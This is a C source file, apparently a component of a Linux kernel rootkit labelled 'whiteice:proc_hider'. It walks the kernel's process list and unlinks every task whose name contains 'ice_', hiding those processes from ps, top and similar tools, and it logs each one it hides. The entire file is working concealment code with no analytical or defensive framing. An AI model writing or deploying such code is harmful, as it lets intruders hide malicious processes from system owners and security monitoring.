#include "defs.h"
#include <linux/sched/signal.h>
#include <linux/string.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#define PROC_PREFIX "ice_"

static int should_hide_process(struct task_struct *task)
{
    if (strstr(task->comm, PROC_PREFIX)) {
        return 1;
    }
    return 0;
}

void hide_prefixed_processes(void)
{
    struct task_struct *task;

    for_each_process(task) {
        if (should_hide_process(task)) {
            list_del_init(&task->tasks);
            printk(KERN_INFO "[whiteice:proc_hider] Hidden process: %s (PID: %d)\n", task->comm, task->pid);
        }
    }
}
